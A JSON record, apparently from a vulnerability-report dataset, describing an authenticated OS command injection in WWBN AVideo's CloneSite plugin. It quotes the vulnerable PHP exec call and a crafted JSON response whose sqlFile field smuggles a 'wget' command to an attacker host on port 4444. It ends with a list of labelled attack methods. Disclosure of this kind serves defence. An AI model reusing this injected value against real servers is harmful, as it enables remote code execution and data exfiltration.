{"description": "# WWBN Avideo Authenticated RCE - OS Command Injection\n\n## Description\n\nAn OS Command Injection vulnerability in an Authenticated endpoint `/plugin/CloneSite/cloneClient.json.php` allows attackers to achieve Remote Code Execution.\n\nVulnerable code:\n\n```php\n$cmd = \"wget -O {$clonesDir}{$json->sqlFile} {$objClone->cloneSiteURL}videos/cache/clones/{$json->sqlFile}\";\n$log->add(\"Clone (2 of {$totalSteps}): Geting MySQL Dump file\");\nexec($cmd . \" 2>&1\", $output, $return_val);\n```\n\nWe can control `$objClone->cloneSiteURL`  through the admin panel clone site feature.\n\n`/plugin/CloneSite/cloneClient.json.php` sends a GET Request to `{$objClone->cloneSiteURL}/plugin/CloneSite/cloneServer.json.php`. I hosted a  specially crafted `cloneServer.json.php` that prints the following JSON data\n\n```JSON\n{\"error\":false,\"msg\":\"\",\"url\":\"https:\\/\\/REDACTED/\\/\",\"key\":\"REDACTED\",\"useRsync\":1,\"videosDir\":\"\\/var\\/www\\/html\\/[demo.avideo.com](http://demo.avideo.com/)\\/videos\\/\",\"sqlFile\":\"Clone_mysqlDump_644ab263e62d6.sql; wget [http://REDACTED:4444/`pwd`](http://redacted:4444/pwd) ;#\",\"videoFiles\":[],\"photoFiles\":[]}\n```\n\nSend a GET Request to `/plugin/CloneSite/cloneClient.json.php` then remote code execution is achieved.\n\n![rce](https://i.ibb.co/h14gQtn/rce.png)", "methods": ["Used OS Command Injection to achieve Remote Code Execution.", "Used a web application to inject malicious code.", "Used a specially crafted JSON file to inject malicious commands.", "Used a GET Request to execute malicious code.", "Used a web application to execute system commands.", "Used a web application to execute a command that executes another command."]}